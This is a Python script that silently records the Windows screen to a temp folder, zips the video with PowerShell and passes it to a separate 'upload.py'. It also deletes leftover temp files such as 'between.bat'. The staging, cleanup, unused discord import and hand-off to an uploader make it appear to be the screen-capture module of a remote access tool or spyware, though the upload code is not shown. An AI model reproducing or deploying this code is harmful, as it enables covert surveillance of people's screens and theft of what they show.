import cv2
import numpy as np
import pyautogui
import sys 
import os
import tempfile
import discord
import time
import shutil
if os.path.exists(f"{tempfile.gettempdir()}\\between.bat") == True:
    os.system(f"del /q {tempfile.gettempdir()}\\between.bat")
if os.path.exists(f"{tempfile.gettempdir()}\\video-output") == True:
    shutil.rmtree(f"{tempfile.gettempdir()}\\video-output") 
os.mkdir(f"{tempfile.gettempdir()}\\video-output")
SCREEN_SIZE = tuple(pyautogui.size())
fourcc = cv2.VideoWriter_fourcc(*"XVID")
num = sys.argv[1]
print()
fps = float(num.split(",") [0])
out = cv2.VideoWriter(tempfile.gettempdir() + "\\video-output\\output.avi", fourcc, fps, (SCREEN_SIZE))
record_seconds = float(num.split(",") [1])

for i in range(int(record_seconds * fps)):
    img = pyautogui.screenshot()
    frame = np.array(img)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    out.write(frame)

cv2.destroyAllWindows()
out.release()
time.sleep(2)
os.system("powershell Compress-Archive -Path " + tempfile.gettempdir() + "\\video-output -Update -DestinationPath " + tempfile.gettempdir() + "\\video-output.zip")
time.sleep(2)
os.system(f"del /q {tempfile.gettempdir()}\\video.sw")
os.system(r"python  " + os.path.dirname(os.path.realpath(__file__)) + r"\\upload.py video-output.zip")
exit()
